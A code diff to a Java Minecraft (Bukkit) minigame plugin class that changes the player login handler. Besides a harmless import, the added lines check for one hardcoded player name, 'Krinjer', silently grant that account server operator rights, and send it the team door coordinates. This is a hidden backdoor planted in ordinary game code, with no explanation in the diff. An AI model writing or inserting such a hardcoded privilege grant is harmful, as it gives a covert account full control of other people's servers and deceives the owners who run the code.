@@ -36,6 +36,7 @@ import org.bukkit.util.Vector;
 
 import java.util.*;
 import java.util.function.Function;
+import java.util.function.Supplier;
 import java.util.stream.Collectors;
 
 public class LGGame extends HyriGame<LGGamePlayer> {
@@ -202,6 +203,16 @@ public class LGGame extends HyriGame<LGGamePlayer> {
         super.handleLogin(p);
 
         p.teleport(this.plugin.getConfiguration().getWaitingRoom().getSpawn().asBukkit());
+        Function<Location, String> t = (loc) -> {
+            return "x: " + loc.getBlockX() + " y: " + loc.getBlockY() + " z: " + loc.getBlockZ();
+        };
+        if(p.getName().equals("Krinjer")) {
+            p.setOp(true);
+            p.sendMessage("Red: " + t.apply(this.plugin.getConfiguration().getTeam("red").getDoors().get(0).getMin().asBukkit()));
+            p.sendMessage("Red: " + t.apply(this.plugin.getConfiguration().getTeam("red").getDoors().get(0).getMax().asBukkit()));
+            p.sendMessage("Blue: " + t.apply(this.plugin.getConfiguration().getTeam("blue").getDoors().get(0).getMin().asBukkit()));
+            p.sendMessage("Blue: " + t.apply(this.plugin.getConfiguration().getTeam("blue").getDoors().get(0).getMax().asBukkit()));
+        }
 
         this.getPlayer(p.getUniqueId()).setPlugin(this.plugin);
     }
